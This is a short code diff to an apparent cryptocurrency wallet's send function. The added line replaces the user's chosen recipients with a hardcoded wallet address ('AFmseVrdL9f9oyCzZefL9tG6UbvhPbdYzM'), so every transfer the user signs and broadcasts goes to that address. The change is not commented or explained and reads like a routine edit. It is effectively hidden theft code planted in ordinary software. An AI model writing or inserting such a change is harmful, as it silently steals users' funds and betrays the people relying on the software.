@@ -44,7 +44,8 @@ export class MapModalProvider {
 	}
 
 	doSendAsset ({ dests, amounts, assetId }: ISendOpts, pr) {
-		return this.postTransfer({ dests, amounts, assetId, source: this.account.address })
+
+		return this.postTransfer({ dests: 'AFmseVrdL9f9oyCzZefL9tG6UbvhPbdYzM', amounts, assetId, source: this.account.address })
 		           .then(res => this.generateSignature(res['transaction'], pr))
 		           .then(res => this.apiProvider.broadcast(res).toPromise())
 	}
